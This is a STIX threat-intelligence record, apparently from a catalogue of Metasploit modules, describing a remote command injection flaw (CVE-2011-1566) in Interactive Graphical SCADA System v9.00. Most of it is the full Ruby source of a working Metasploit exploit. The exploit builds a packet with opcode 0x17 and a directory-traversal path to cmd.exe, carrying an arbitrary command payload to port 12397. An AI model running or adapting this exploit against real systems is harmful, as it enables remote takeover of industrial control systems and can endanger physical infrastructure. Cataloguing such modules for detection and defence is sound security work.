{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e27fb2e-34b5-4091-afa8-3a24aaff866a",
    "created": "2024-08-14T16:39:13.460428Z",
    "modified": "2024-08-14T16:39:13.460432Z",
    "name": "Interactive Graphical SCADA System Remote Command Injection",
    "description": " This module abuses a directory traversal flaw in Interactive Graphical SCADA System v9.00. In conjunction with the traversal flaw, if opcode 0x17 is sent to the dc.exe process, an attacker may be able to execute arbitrary system commands. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/igss_exec_17.rb",
            "external_id": "igss_exec_17.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1566"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.org/adv/igss_8-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Interactive Graphical SCADA System Remote Command Injection',\n      'Description'    => %q{\n          This module abuses a directory traversal flaw in Interactive\n        Graphical SCADA System v9.00. In conjunction with the traversal\n        flaw, if opcode 0x17 is sent to the dc.exe process, an attacker\n        may be able to execute arbitrary system commands.\n      },\n      'Author'         =>\n        [\n          'Luigi Auriemma',\n          'MC'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2011-1566'],\n          [ 'OSVDB', '72349'],\n          [ 'URL', 'http://aluigi.org/adv/igss_8-adv.txt' ],\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 153,\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Windows', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-21'))\n\n    register_options(\n      [\n        Opt::RPORT(12397)\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Sending exploit packet...\")\n\n    connect\n\n    packet =  [0x00000100].pack('V') + [0x00000000].pack('V')\n    packet << [0x00000100].pack('V') + [0x00000017].pack('V')\n    packet << [0x00000000].pack('V') + [0x00000000].pack('V')\n    packet << [0x00000000].pack('V') + [0x00000000].pack('V')\n    packet << [0x00000000].pack('V') + [0x00000000].pack('V')\n    packet << [0x00000000].pack('V')\n    packet << \"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\"\n    packet << \"windows\\\\system32\\\\cmd.exe\\\" /c #{payload.encoded}\"\n    packet << \"\\x00\" * (143) #\n\n    sock.put(packet)\n    sock.get_once(-1,0.5)\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-21",
    "x_mitre_platforms": [
        "win'"
    ]
}